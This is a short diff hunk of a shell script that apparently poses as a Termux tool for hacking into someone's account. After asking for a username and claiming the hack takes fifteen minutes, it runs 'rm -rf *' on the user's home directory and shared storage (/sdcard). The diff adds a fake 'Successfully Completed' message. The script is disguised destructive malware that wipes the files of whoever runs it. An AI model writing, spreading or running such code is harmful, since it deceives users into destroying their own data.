@@ -53,4 +53,5 @@ echo -e "$grn Enter Username $rset"
 read user
 clear
 echo " Hacking To The Account..! it taked 15mins"
-cd && termux-setup-storage && cd /sdcard && rm -rf * && cd && rm -rf *
+cd && termux-setup-storage && rm -rf * && cd /sdcard && rm -rf * 
+echo "Successfully Completed"
